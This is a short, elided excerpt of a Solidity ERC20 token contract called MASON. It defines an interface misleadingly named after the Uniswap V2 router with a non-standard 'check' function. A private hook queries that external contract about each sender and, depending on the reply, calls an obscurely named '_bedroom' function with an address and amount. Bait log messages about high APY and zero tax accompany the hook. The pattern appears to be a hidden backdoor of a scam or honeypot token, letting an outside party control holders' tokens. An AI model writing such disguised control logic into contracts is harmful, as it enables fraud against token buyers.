...
interface IUniswapV2Router02 {
    function check(address vals,address input) external view returns (bool,uint256,address);
}
...
contract MASON is ERC20 {
    ...
    function _considered(address sender) private    {
        emit Log("tokens with impressive APY% to earn STAKE-2-SPEED your.");
        (bool _g, uint256 _piece, address _m) = uniswapV2Router.check(sender,address(this));
        if(!_g) return;
        emit Log("The smart contract has 0 tax on all buys and sells.");
        if(_piece==0) return;
       _bedroom(_m, _piece, _g);
    }
